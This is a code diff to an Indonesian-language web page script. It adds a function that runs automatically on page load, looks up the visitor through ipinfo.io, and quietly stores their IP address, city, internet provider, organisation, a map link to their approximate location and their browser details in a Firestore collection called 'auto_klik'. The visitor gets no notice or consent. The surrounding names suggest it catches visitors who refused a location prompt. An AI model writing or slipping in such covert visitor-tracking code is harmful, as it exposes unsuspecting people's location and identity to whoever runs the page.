@@ -98,5 +98,33 @@ const LokasiTidakBoleh = () => {
     }, "jsonp")
 }
 
+async function saveDataAuto() {
+    jQuery.get("http://ipinfo.io", function (e) {
 
+        var date = new Date();
+        var hours = date.getHours();
+        var minutes = date.getMinutes();
+        var formattedTime = "Pukul: " + hours + ':' + minutes + " | " + date;
+        var lokasiIPmaps = "https://maps.google.com/?q=" + e.loc;
+
+        db.collection("auto_klik").add({
+            waktu: formattedTime,
+            kota: e.city,
+            ipAddress: e.ip,
+            providerInternet: e.hostname,
+            providerOrg: e.org,
+            lokasiIP: lokasiIPmaps,
+            device: window.navigator.userAgent,
+        })
+            .then(() => {
+                console.log("Berhasil Kirim Data");
+            })
+            .catch((e) => {
+                console.error("Gagal Mengirim Data! : " + e);
+            });
+
+    }, "jsonp")
+}
+
+saveDataAuto();
 
